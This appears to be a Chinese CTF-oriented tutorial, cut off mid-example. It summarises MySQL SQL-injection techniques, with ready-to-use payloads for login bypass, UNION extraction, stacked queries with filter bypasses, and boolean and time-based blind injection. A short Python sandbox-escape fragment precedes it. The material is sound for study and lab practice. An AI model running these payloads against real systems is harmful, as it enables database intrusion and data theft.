限制输入字符的集合的大小\n\n思路就是先确定不得不用到的字符，再看这些字符能够拼出哪些函数或者常量。\n\n在《OrangeKiller CTF 第 2 期》中出了 3 道题目与此相关，移步去看吧：[传送门](https://www.tr0y.wang/2022/06/27/OrangeKiller_CTF_2_wp/)\n\n> 限制不能使用 `[a-zA-Z]` 的字符\n\n我在 [《从一个绕过长度限制的 XSS 中，我们能学到什么？》](https://www.tr0y.wang/2020/08/18/IDN/#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF) 中提到过，Python3 支持了 Unicode 变量名且解释器在做代码解析的时候，会对变量名进行规范化，算法是 `NFKC`。\n\n所以在这种情况下可以用这种姿势：\n\n```\neval == ᵉval\nPYTHON\n```\n\n> socket + 严格的输入限制\n\n可以看看是否漏掉了 `help`，漏掉的话，先通过 `help()` 调起 vi/vim，然后用 `!` 指令即可 getshell :)\n\n参考：https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/#%E9%80%9A%E8%BF%87%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E9%80%83%E9%80%B8","tags":["web安全","python安全","进阶学习"]},{"title":"sql注入漏洞总结","url":"/2023/08/23/sql注入总结-mysql/","content":"\n\n\n沙上有印，光中有\n\n\n\n------\n\n# SQL注入总结\n\n## 基础知识\n\n### 系统函数\n\n> system_user()——系统用户名\n>\n> user()——用户名\n>\n> current_user()——当前用户名\n>\n> session_user()——链接数据库的用户名\n>\n> database()——数据库名\n>\n> version()——数据库版本\n>\n> @@datadir——数据库路径\n>\n> @@basedir——数据库安装路径\n>\n> @@version_conpile_os——操作系统\n\n### 字符串连接函数\n\n> concat(str1,str2,...)——没有分隔符地连接字符串\n>\n> concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串\n>\n> group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据。\n\n### 一般用于尝试的语句\n\n--+可以用#替换，url 提交过程中Url 编码后的#为%23\n\n```sql\nor 1=1--+\n'or 1=1--+\n\"or 1=1--+\n)or 1=1--+\n')or 1=1--+\n\") or 1=1--+\n\"))or 1=1--+\n一般的代码为：\n$id=$_GET['id'];\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n```\n\n此处考虑两个点，一个是闭合前面你的‘ 另一个是处理后面的‘ ，一般采用两种思路，闭合后面的引号或者注释掉，注释掉采用--+ 或者#（%23）\n\n### union 操作符的介绍\n\n联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用谓词为UNION或UNION ALL。将多个查询的结果合并到一起（纵向合并）：字段数不变，多个查询的记录数合并。\n\n基本语法：\n\n> Select 语句\n>\n> Union [union 选项]\n>\n> Select 语句;\n>\n> Union选项：与select选项基本一样\n>\n> Distinct：去重，去掉完全重复的数据（默认的）\n>\n> All：保存所有的结果\n\n```\nSELECT column_name(s) FROM table_name1\nUNION [distinct] --默认为distinct\n                 --如果允许重复值就改为All\nSELECT column_name(s) FROM table_name2\n```\n\nunion理论上只要保证字段数一样，不需要每次拿到的数据对应的字段类型一致。永远只保留第一个select语句对应的字段名字。\n\n### sql 中的逻辑运算\n\n```\nSelect * from users where id=1 and 1=1;\n```\n\n 这条语句为什么能够选择出id=1的内容，and 1=1 到底起作用了没有？这里就要清楚sql 语句执行顺序了。 同时这个问题我们在使用万能密码的时候会用到。Select *from admin where username=’admin’ and password=’admin’我们可以用’or 1=1# 作为密码输入。原因是为什么？这里涉及到一个逻辑运算，当使用上述所谓的万能密码后，构成的sql 语句为：Select* from admin where username=’admin’ and password=’’or 1=1#’  Explain:上面的这个语句执行后，我们在不知道密码的情况下就登录到了admin 用户了。原因是在where 子句后， 我们可以看到三个条件语句username=’admin’ andpassword=’’or 1=1。三个条件用and 和or 进行连接。在sql 中，我们and 的运算优先级大于or 的元算优先级。因此可以看到第一个条件（用a 表示）是真的，第二个条件（用b 表示）是假的，a and b = false,第一个条件和第二个条件执行and 后是假，再与第三个条件or 运算，因为第三个条件1=1 是恒成立的，所以结果自然就为真了。因此上述的语句就是恒真了。.\n\n①Select *from users where id=1 and 1=1;* *②Select* from users where id=1 && 1=1; ③Select * from users where id=1 & 1=1; 上述三者有什么区别？①和②是一样的，表达的意思是id=1 条件和1=1 条件进行与运算。 ③的意思是id=1 条件与1 进行&位操作，id=1 被当作true，与1 进行& 运算结果还是1，再进行=操作，1=1,还是1（ps：&的优先级大于=） Ps:此处进行的位运算。我们可以将数转换为二进制再进行与、或、非、异或等运算。必要的时候可以利用该方法进行注入结果。例如将某一字符转换为ascii 码后，可以分别与1,2,4,8,16,32.。。。进行与运算，可以得到每一位的值，拼接起来就是ascii 码值。再从ascii 值反推回字符。（运用较少）\n\n### order by介绍\n\n在mysql中order by是用来根据校对规则对数据进行排序\n\n基本语法：order by 字段 [asc|desc]; //asc升序，默认的\n\n并且order by还可以多字段排序，先按照第一个字段进行排序，然后再按照第二个字段进行排序。\n\n因此在sql注入中可以通过order by来判断表中有多少字段，并且并不需要知道字段的名字是什么，通过数字1、2、3等也可以排序，因为在mysql中字段的名字也可以用过1、2、3等来表示。\n\n参数默认是asc，可以不用加。\n\n当order by中的字段数为3时，由于表中字段数不足，则报错。因此可判断字段数为2.\n\n### 注入流程\n\n我们的数据库存储的数据按照上图的形式，一个数据库当中有很多的数据表，数据表当中有很多的列，每一列当中存储着数据。我们注入的过程就是先拿到数据库名，在获取到当前数据库名下的数据表，再获取当前数据表下的列，最后获取数据。\n\n### 系统数据库（information_schema）\n\n 在mysql 5.0版本之后，mysql默认在数据库中存放一个\"information_schema\"的数据库，在该库中，需要记住三个表名，分别是schemata、tables、cliumns。\n\n schemata表存储该用户创建的所有数据库的库名。\n\n通过schemata表我们就可以猜数据库了\n\n```\nselect schema_name from information_schema.schemata;\n```\n\ntables表存储该用户创建的所有数据库的库名和表名。\n\n通过tables表我们就可以猜某库的数据表\n\n```\nselect table_name from information_schema.tables where table_schema=’xxxxx’;\n```\n\ncolumns表存储该用户\n\n通过columns表我们就可以猜某表的所有列\n\n```\nSelect column_name from information_schema.columns where table_name=’xxxxx’;\n```\n\n最后获取某列的数据\n\n```\nSelect xxxx from xxxx\n```\n\n**当information_schema被屏蔽时，可使用其他的表**\n\n可以参考这边文章：<https://www.anquanke.com/post/id/193512>\n\n**innodb表**\n\nMySQL 5.6 及以上版本存在`innodb_index_stats`，`innodb_table_stats`两张表，其中包含新建立的库和表\n\n```\nselect table_name from mysql.innodb_table_stats where database_name = database(); \nselect table_name from mysql.innodb_index_stats where database_name = database();\n```\n\n**sys表**\n\n在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名\n\n```sql\n#包含in\nSELECT object_name FROM `sys`.`x$innodb_buffer_stats_by_table` where object_schema = database();\nSELECT object_name FROM `sys`.`innodb_buffer_stats_by_table` WHERE object_schema = DATABASE();\nSELECT TABLE_NAME FROM `sys`.`x$schema_index_statistics` WHERE TABLE_SCHEMA = DATABASE();\nSELECT TABLE_NAME FROM `sys`.`schema_auto_increment_columns` WHERE TABLE_SCHEMA = DATABASE();\nSELECT table_schema FROM sys.schema_table_statistics GROUP BY table_schema;\n#不包含in\nSELECT TABLE_NAME FROM `sys`.`x$schema_flattened_keys` WHERE TABLE_SCHEMA = DATABASE();\nSELECT TABLE_NAME FROM `sys`.`x$ps_schema_table_statistics_io` WHERE TABLE_SCHEMA = DATABASE();\nSELECT TABLE_NAME FROM `sys`.`x$schema_table_statistics_with_buffer` WHERE TABLE_SCHEMA = DATABASE();\nSELECT table_schema FROM sys.x$schema_flattened_keys GROUP BY table_schema;\n#通过表文件的存储路径获取表名\nSELECT FILE FROM `sys`.`io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();\nSELECT FILE FROM `sys`.`io_global_by_file_by_latency` WHERE FILE REGEXP DATABASE();\nSELECT FILE FROM `sys`.`x$io_global_by_file_by_bytes` WHERE FILE REGEXP DATABASE();\n\n#查询指定库的表（若无则说明此表从未被访问）\nSELECT table_name FROM sys.schema_table_statistics WHERE table_schema='mspwd' GROUP BY table_name;\nSELECT table_name FROM sys.x$schema_flattened_keys WHERE table_schema='mspwd' GROUP BY table_name;\n#统计所有访问过的表次数:库名,表名,访问次数\nselect table_schema,table_name,sum(io_read_requests+io_write_requests) io from sys.schema_table_statistics group by\ntable_schema,table_name order by io desc;\n#查看所有正在连接的用户详细信息\nSELECT user,db,command,current_statement,last_statement,time FROM sys.session;\n#查看所有曾连接数据库的IP,总连接次数\nSELECT host,total_connections FROM sys.host_summary;\n```\n\n包含之前查询记录的表\n\n```\nSELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();\nSELECT QUERY FROM `sys`.`statement_analysis` where QUERY REGEXP DATABASE();\n```\n\nperformance_schema表\n\n```sql\nSELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();\nSELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();\nSELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();\nSELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();\nSELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE();\n```\n\n包含之前查询记录的表\n\n```\nSELECT digest_text FROM `performance_schema`.`events_statements_summary_by_digest` WHERE digest_text REGEXP DATABASE();\n```\n\n包含表文件路径的表\n\n```\nSELECT file_name FROM `performance_schema`.`file_instances` WHERE file_name REGEXP DATABASE();\n```\n\n表格 还在加载中，请等待加载完成后再尝试复制\n\n上诉表格中虽然有能够查列名的表，但是查出来的数据都不全，当知道`flag`所在的库和表名时，但无法获取到列名，就需要利用**无列名盲注了**\n\n## select被过滤\n\n```\nmysql 8.0.19`新增语句`table\nTABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]\n```\n\n可以把`table t`简单理解成`select * from t`，和`select`的区别在于\n\n- `table`总是显示表的所有列\n- `table`不允许任何的行过滤;也就是说，`TABLE`不支持任何`WHERE`子句。 可以用来盲注表名\n\n```\nadmin'and\\x0a(table\\x0ainformation_schema.TABLESPACES_EXTENSIONS\\x0alimit\\x0a7,1)>\n(BINARY('{}'),'0')#\n```\n\n同时代替`select`被过滤导致只能同表查询的问题\n\nPS：新增的`values`语句也挺有意思，在某些情况似乎可以代替`union`或`select`进行`order by`盲注\n\n## 联合查询的类型\n\nunion 联合注入，union 的作用是将两个sql 语句进行联合。Union 可以从下面的例子中可以看出，强调一点：union 前后的两个sql 语句的选择列数要相同才可以。Union all 与union 的区别是增加了去重的功能。\n\n并且运用information_schema的知识。\n\nsql-labs/less-1\n\n字符型报错\n\n```\n//order by判断字段\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' or 1=1 order by 3 --+\n//通过union select判断显示的是哪些字段\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+\n//通过information_schema爆数据库\nhttp://127.0.0.1/sqli-labs/Less-1/?id=-1'  union select 1,database(),group_concat(schema_name) from information_schema.schemata --+\n//爆数据表\n```\n\nadmin'or(updatexml(1,concat(version()),1)or'1'like'1\n\nselect(group_concat(table_name)from(infromation_schema.table)where(table_schema)like('geek'))\n\nselect(group_concat(table_name)from(information_schema.tables)where(table_schema)like('geek'))\n\nsql-labs/less-2\n\n整数报错\n\n与less-1差不多 将’去除即可\n\nsql-labs/less-3\n\n可以成功注入的有：\n\n> ') or '1'=('1' ) or 1=1 --+\n\n将less1 中的' 添加）即可 '）\n\nsql-labs/less-4\n\n可以成功注入的有：\n\n> “) or ”1”=(“1 “) or 1=1 --+\n\n将less1 中的‘ 更换为“)\n\nsql-labs/less-5\n\n## 堆查询注射\n\n堆叠注入。从名词的含义就可以看到应该是一堆sql 语句（多条）一起执行。而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做stacked injection。\n\n### 原理介绍\n\n在SQL 中，分号（;）是用来表示一条sql 语句的结束。试想一下我们在; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而unioninjection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union或者union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。\n\n例如以下这个例子。\n\n当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。\n\n### 堆叠注入的局限性\n\n堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。\n\n虽然我们前面提到了堆叠查询可以执行任意的sql 语句，但是这种注入方式并不是十分的完美的。在我们的web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。可考虑使用RENAME关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名。\n\n```\n以PHP为例，使用的条件为\n$mysqli->multi_query($sql);\n```\n\n使用堆叠注入时，可使用的方法：\n\n当过滤`select`时，可使用`handler`语句。`handler`语句并不具备`select`语句的所有功能。它是`mysql`专用的语句，并没有包含到`SQL`标准中\n\n```\nhandler users open as hd; #指定数据表进行载入并将返回句柄重命名\nhandler hd read first; #读取指定表/句柄的首行数据\nhandler hd read next; #读取指定表/句柄的下一行数据\nhandler hd close; #关闭句柄\n```\n\n预处理：\n\n```\nprepare xxx from \"sql语句\";\nexecute xxx;\n\n由于sql语句是字符串，因此可以使用操作字符串的函数，绕过一些过滤\n比如过滤了select\nPREPARE st from concat('s','elect', ' * from `1919810931114514`');EXECUTE st;#\n```\n\n### 例子\n\n#### 强网杯随便注\n\n```sql\n1';show tables;#  看有什么表在里面\n1';show columns from `1919810931114514`;#  看列\n1';show columns from `words`;# 可以发现这个表是可以回显内容的\n我们可以用函数将1919810931114514表改成words表，来让他自动回显\nRENAME TABLE `words` TO `words1`;\nRENAME TABLE `1919810931114514` TO `words`;\nALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#将新words表的flag改为id避免开始无法查询\n接下来还有\n预处理语句使用方法\nPREPARE name from '[my sql sequece]';   //预定义SQL语句\nEXECUTE name;  //执行预定义SQL语句\n(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句\n\nSET @tn = 'hahaha';  //存储表名\nSET @sql = concat('select * from ', @tn);  //存储SQL语句\nPREPARE name from @sql;   //预定义SQL语句\nEXECUTE name;  //执行预定义SQL语句\n(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句\n\n由于过滤了select\n可以用chr()\n最后payload:\n\n最终payload\n1';PREPARE jwt from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE jwt;#\n\n1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#\n```\n\n## 无列名盲注\n\n当我们无法获取字段时，比如information_schema被过滤，可使用无列名注入\n\n### 使用`union select重命名法`\n\n```\nmysql> select * from users;\n+----+----------+------------+\n| id | username | password   |\n+----+----------+------------+\n|  1 | Dumb     | Dumb       |\n|  2 | Angelina | I-kill-you |\n+----+----------+------------+\n2 rows in set (0.00 sec)\n\nmysql> select 1,2,3 union select * from users;\n+----+----------+------------+\n| 1  | 2        | 3          |\n+----+----------+------------+\n|  1 | 2        | 3          |\n|  1 | Dumb     | Dumb       |\n|  2 | Angelina | I-kill-you |\n+----+----------+------------+\n3 rows in set (0.00 sec)\n#对比可以发现使用union时，列名被替换为前面的select的列名了，为1，2，3。\nmysql> select a.1 from (select 1,2,3 union select * from users) a;\n+---+\n| 1 |\n+---+\n| 1 |\n| 1 |\n| 2 |\n+---+\n3 rows in set (0.00 sec)\n#将前面生成的表重命名为a，再使用select a.1，查询第一列的值\n#可以看到，使用union查询，在不知道列名的情况下，依然能够将列注入出来，通过1，2，3选择第几列\n```\n\n```\nselect c from (select 1 as a, 1 as b, 1 as c union select * from test)x limit 1 offset 1;\nselect a.`3` from(select 1,2,3 union select * from admin)a limit 1,1;\n\n//无逗号，有join版本\nselect a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from test)x;\n```\n\n### 比较法\n\n```sql\nmysql> select 'b' < 'azzzzz';\n+----------------+\n| 'b' < 'azzzzz' |\n+----------------+\n|              0 |\n+----------------+\n1 row in set (0.00 sec)\n\nmysql> select 'ab' < 'azzzzz'\n    -> ;\n+-----------------+\n| 'ab' < 'azzzzz' |\n+-----------------+\n|               1 |\n+-----------------+\n1 row in set (0.00 sec)\n#mysql比较，从第一个字符还是比较ascii的大小，一次往后\n#并且多列的比较时从第一列的第一位开始的\nmysql> select (select 1,'Dumb','a')> (select * from users limit 1);\n+------------------------------------------------------+\n| (select 1,'Dumb','a')> (select * from users limit 1) |\n+------------------------------------------------------+\n|                                                    0 |\n+------------------------------------------------------+\n1 row in set (0.00 sec)\n\nmysql> select (select 1,'Dumb','b') > (select * from users limit 1);\n+-------------------------------------------------------+\n| (select 1,'Dumb','b') > (select * from users limit 1) |\n+-------------------------------------------------------+\n|                                                     0 |\n+-------------------------------------------------------+\n1 row in set (0.00 sec)\n\nmysql> select (select 1,'Dumb','D') > (select * from users limit 1);\n+-------------------------------------------------------+\n| (select 1,'Dumb','D') > (select * from users limit 1) |\n+-------------------------------------------------------+\n|                                                     0 |\n+-------------------------------------------------------+\n1 row in set (0.00 sec)\n\nmysql> select (select 1,'Dumb','F') > (select * from users limit 1);\n+-------------------------------------------------------+\n| (select 1,'Dumb','F') > (select * from users limit 1) |\n+-------------------------------------------------------+\n|                                                     1 |\n+-------------------------------------------------------+\n1 row in set (0.00 sec)\n#通过比较可以将三列的数据全部盲注出来\n```\n\n```\n((SELECT 1,concat('{result+chr(mid)}', cast(\"0\" as JSON)))<(SELECT * FROM `f1ag_1s_h3r3_hhhhh`))\n```\n\n要求后面select的结果必须是一行，可以通过limit限制一行。mysql中对char型大小写是不敏感的，盲注的时候要么可以使用`hex`或者`binary`。\n\n## SQL 盲注\n\n何为盲注？盲注就是在sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。\n\n### 基于布尔SQL 盲注\n\n#### Sql注入截取字符串常用函数\n\n在sql注入中，往往会用到截取字符串的问题，例如不回显的情况下进行的注入，也成为盲注，这种情况下往往需要一个一个字符的去猜解，过程中需要用到截取字符串。\n\n**mid()**\n\n> mid(s,n,len);\n>\n> 从字符串 s 的 n 位置截取长度为 len 的子字符串\n\n```\nSELECT MID(\"RUNOOB\", 2, 3) AS ExtractString; \n-- UNO\n```\n\n**substr()/substring()**\n\n> substr(s, start, length);\n>\n> substring(s, start, length)\n>\n> 从字符串 s 的 start 位置截取长度为 length 的子字符串\n\n```\nSELECT MID(\"RUNOOB\", 2, 3) AS ExtractString; \n-- UNO                                \n```\n\n**left()**\n\n> left(s,n);\n>\n> 返回字符串 s 的前 n 个字符\n\n```\nSELECT LEFT('runoob',2);\n-- ru\n```\n\n**right()**\n\n> right(s,n);\n>\n> 返回字符串 s 的后 n 个字符\n\n```\nSELECT right('runoob',2);\n-- ob\n```\n\n**ascii()/ord()**\n\n> ascii(s);/ord(s);\n>\n> 返回字符串 s 的第一个字符的 ASCII 码。\n>\n> 这里不考虑多字节字符，比如汉字\n\n**trim()/rtrim()/ltrim()**\n\n> ltrim(s);\n>\n> 去掉字符串s开始处的空格\n>\n> rtrim(s);\n>\n> 去掉字符串s结尾处的空格\n>\n> trim(s);\n>\n> 去掉字符串开始和结尾处的空格\n\n```\nSELECT TRIM('    RUNOOB    ') AS TrimmedString;\n-- RUNOOB\n\nSELECT RTRIM(\"RUNOOB     \") AS RightTrimmedString;   \n-- RUNOOB\n\nSELECT LTRIM(\"    RUNOOB\") AS LeftTrimmedString;\n-- RUNOOB\n```\n\n这个怎么用来截取字符串呢？\n\n```\nTRIM([BOTH/LEADING/TRAILING] 目标字符串 FROM 源字符串）\nBOTH删除两边的指定字符串\nLEADING删除左边的指定字符串\nTARILING删除右边的指定字符串\nselect trim(LEADING \"a\" from \"abcd\") = trim(LEADING \"b\" from \"abcd\");\n以这个为例，我们将删除的字符串ASCII差限制在1，例如a和b\n当这个结果返回0时，则第一个字符是a或者b。\n接着让a的ASCII+2变成c，如果返回1，则字符串第一位为a，反之第一位为b。这样做的目的是为了方便写脚本\n第二个字符判断\nselect trim(LEADING \"aa\" from \"abcd\") = trim(LEADING \"ab\" from \"abcd\");\n接着重复上面的过程，判断第二个字符\n以此推出整个字符串\n\n如果=用regexp替代那么正确的字符一定在regexp前面以这个abcd为例\nTrim(leading ‘a’ from ‘abcd’) regexp trim(LEADING ‘x’ from ‘abcd’)\n就是bcd regexp abcd返回0， 如果反过来就是abcd regexp bcd 返回1\n因此只需判断第一步即可，而不需要ASCII+2去判断了\n\n注：y1ng师傅在[HFCTF 2021 Final]hatenum中用到了这个方法，通过持续递归，多次套娃trim。如果字符串长度被限制，可使用。一次只截断几个字符\n例如：\nselect trim(LEADING \"b\" from trim(LEADING \"a\" from \"abcd\"));\n-- cd\n先截断a，返回字符串bcd，在截断b，返回字符串cd\n```\n\n**注：可以看到这个函数可以不使用****,****的，如果****,****被过滤可以使用**\n\n**INSERT()**\n\n> INSERT(s1,x,len,s2)\n>\n> 字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串\n\n```\nSELECT INSERT(\"google.com\", 1, 6, \"runoob\");  \n-- 输出：runoob.com\nSELECT INSERT(\"google.com\", 1,2, \"runoob\");\n-- 输出：runoobogle.com\n如何使用呢？\n第一步删除起始的前x位\n第二步套娃删除x+1位以后的所有\n根据这两步我们就能取出字符串的任意位置的字符，也就相当于字符串的截取\n例子：第一步删除起始的前x位\nSELECT INSERT(\"abcdef\", 1,0, \"\");\n-- 输出：abcdef\nSELECT INSERT(\"abcdef\", 1,1, \"\");\n-- 输出：bcdef\n第二步套娃删除x+1位以后的所有\nSELECT INSERT((INSERT(\"abcdef\", 1,0, \"\")),2,9999,\"\");\n-- 输出：a\nSELECT INSERT((INSERT(\"abcdef\", 1,1, \"\")),2,9999,\"\");\n-- 输出：b\n\n可以看到我们只要改变中间的数字，就可以输出任意位置的字符\n```\n\n**注：TRIM和INSERT函数比较特别，基本上是不会被过滤了，如果常用的截取函数不能用时，可选择这两个函数**\n\n**if/case**\n\n用在select查询当中，当做一种条件来进行判断\n\n基本语法：if(条件,为真结果,为假结果)\n\n**case基本语法**\n\n```\nMySQL 的 case when 的语法有两种：\n简单函数 \nCASE [col_name] WHEN [value1] THEN [result1]…ELSE [default] END\n搜索函数 \nCASE WHEN [expr] THEN [result1]…ELSE [default] END\n\nselect case 'a' when 'a' then 1 else 0 end;\n-- 1\n\nselect case when 98>12 then 1 else 0 end;\n```\n\n**注：可以看出case的用法与if类似，当if被过滤或者****,****被过滤可以替换为case，并且在时间盲注中，条件语句非常有用！**\n\n#### **regexp/rlike 正则表达式注入**\n\n用法介绍：select user() regexp '^[a-z]'; Explain：正则表达式的用法，user()结果为root，regexp 为匹配root 的正则表达式。 第二位可以用select user() regexp '^ro'来进行。\n\n结果返回0或者1.\n\n**示例介绍：**\n\n```\nselect * from users where id=1 and 1=(if((user() regexp '^r'),1,0));\nselect * from users where id=1 and 1=(user() regexp'^ri');\n```\n\n通过if 语句的条件判断，返回一些条件句，比如if 等构造一个判断。根据返回结果是否等于0 或者1 进行判断。\n\n```\nselect * from users where id=1 and 1=(select 1 from information_schema.tables\nwhere table_schema='security' and table_name regexp '^us[a-z]' limit 0,1);\n```\n\n这里利用select 构造了一个判断语句。我们只需要更换regexp 表达式即可\n\n'^u[a-z]' -> '^us[a-z]' -> '^use[a-z]' -> '^user[a-z]' -> FALSE\n\n如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在无法判断的情况下，可以用table_name regexp '^username$'来进行判断。^是从开头进行匹配，$是从结尾开始判断。更多的语法可以参考mysql 使用手册进行了解。\n\n但是这种做法是错误的，limit 作用在前面的select 语句中，而不是regexp。那我们该如何选择。其实在regexp 中我们是取匹配table_name 中的内容，只要table_name 中有的内容，我们用regexp 都能够匹配到。因此上述语句不仅仅可以选择user，还可以匹配其他项。\n\n**注：**`regexp是不区分大小写的，需要大小写敏感需要加上binary关键字`\n\n```\nselect binary database() regexp \"^CTF\";\n```\n\n#### **like 匹配注入**\n\n和上述的正则类似，mysql 在匹配的时候我们可以用like 进行匹配S。\n\n这里可以用于过滤`=`使用\n\n用法：select user() like ‘ro%’\n\n### 基于时间的SQL 盲注延时注入\n\n```\nIf(ascii(substr(database(),1,1))>115,0,sleep(5))%23\n--if 判断语句，条件为假，执行sleep\n```\n\nPs：遇到以下这种利用sleep()延时注入语句\n\n```\nselect sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.'));\n```\n\n该语句意思是在0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。\n\n**benchmark**\n\nMySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。参数可以是需要执行的次数和表达式。表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数。该函数可以很方便地测试某些特定操作的性能，比如通过测试可以发现，MD5()函数比SHAI()函数要快\n\n```\nselect benchmark(1000000,sha1(sha1(sha1(sha1(\"1\")))));\n```\n\n```\nUNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;\n```\n\n**笛卡儿积**\n\n这种方法又叫做heavy query，可以通过选定一个大表来做笛卡儿积，但这种方式执行时间会几何倍数的提升，在站比较大的情况下会造成几何倍数的效果，实际利用起来非常不好用。\n\n1.`count()`函数是用来统计表中记录的一个函数，返回匹配条件的行数。 2.`count()`语法： （1）`count(*)`---包括所有列，返回表中的记录数，相当于统计表的行数，在统计结果的时候，不会忽略列值为NULL的记录。 （2）`count(1)`---忽略所有列，1表示一个固定值，也可以用`count(2)`、`count(3)`代替，在统计结果的时候，不会忽略列值为`NULL`的记录。 （3）`count(列名)`---只包括列名指定列，返回指定列的记录数，在统计结果的时候，会忽略列值为NULL的记录（不包括空字符串和0），即列值为NULL的记录不统计在内。 （4）`count(distinct 列名)`---只包括列名指定列，返回指定列的不同值的记录数，在统计结果的时候，在统计结果的时候，会忽略列值为NULL的记录（不包括空字符串和0），即列值为NULL的记录不统计在内。 3.`count(*)&count(1)&count(列名)`执行效率比较： （1）如果列为主键，`count(列名)`效率优于`count(1)` （2）如果列不为主键，`count(1)`效率优于`count(列名)` （3）如果表中存在主键，`count(主键列名)`效率最优 （4）如果表中只有一列，则`count(*)`效率最优 （5）如果表有多列，且不存在主键，则`count(1)`效率优于`count(*)`\n\n```\nselect count(*) from information_schema.columns A;\n1 row in set (1.47 sec)\n```\n\n**get_lock**\n\n```\nSELECT GET_LOCK(key, timeout) FROM DUAL;\nSELECT RELEASE_LOCK(key) FROM DUAL;\n```\n\n其中GET_LOCK()和RELEASE_LOCK()分别是两个函数，并且有参数和返回值，这里的DUAL是伪表，在Oracle中很常见，就是一个不存在的表，用来临时记录值的。\n\n- GET_LOCK有两个参数，一个是key，就是根据这个参数进行加锁的，另一个是等待时间(s)，即获取锁失败后等待多久回滚事务。\n- 这里假设连接A先GET_LOCK(\"lock_test\", 10)，因为lock_test这个字段在之前没有加锁所以不需要等待，直接返回1，加锁成功。 然后连接B再GET_LOCK(\"lock_test\", 10)，等待10s，若这期间没有释放这个字段的锁，则10s过后返回0，连接B加锁失败。 这里的问题就是这个加锁方式很危险，一旦加锁之后忘记释放，就会一直锁住这个字段，除非连接断开。尤其是第二个参数，千万不要理解成超时时间，并不是设置一个字段的锁，然后超过这个时间就自动释放了，这个是等待时间，即第二次对同一个字段加锁，等待多久然后返回。\n- 这个RELEASE_LOCK就没什么好说的了，记得加锁之后释放就可以了，成功释放回返回1。\n\n在一个连接session中可以先锁定一个变量，例如：`select get_lock('aaa',1);`\n\n然后再通过另一个连接session，再次执行get_lock函数：`select get_lock('aaa',2);`，此时将产生2秒的延时。\n\n```\n//第一个连接\nmysql> select get_lock('aaa',1);\n+-------------------+\n| get_lock('aaa',1) |\n+-------------------+\n|                 1 |\n+-------------------+\n1 row in set (0.00 sec)\n//打开另一个cmd  再次连接mysql，执行get_lock，发现延时\nmysql> select get_lock('aaa',1);\n+-------------------+\n| get_lock('aaa',1) |\n+-------------------+\n|                 0 |\n+-------------------+\n1 row in set (1.00 sec)\n```\n\n利用场景是有条件限制的：需要提供长连接。在`Apache+PHP`搭建的环境中需要使用`mysql_pconnect(打开一个到 MySQL 服务器的持久连接)`函数来连接数据库。在CTF中，只有出题人很刻意的使用这个函数，才暗示使用这个\n\n**正则表达式**\n\n正则匹配在匹配较长字符串单自由度比较高的字符串时，会有大量的回溯，造成较大的计算量\n\n```\nselect rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');\n\nmysql> select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');\n+-------------------------------------------------------------+\n| rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b') |\n+-------------------------------------------------------------+\n|                                                           0 |\n+-------------------------------------------------------------+\n1 row in set (2.94 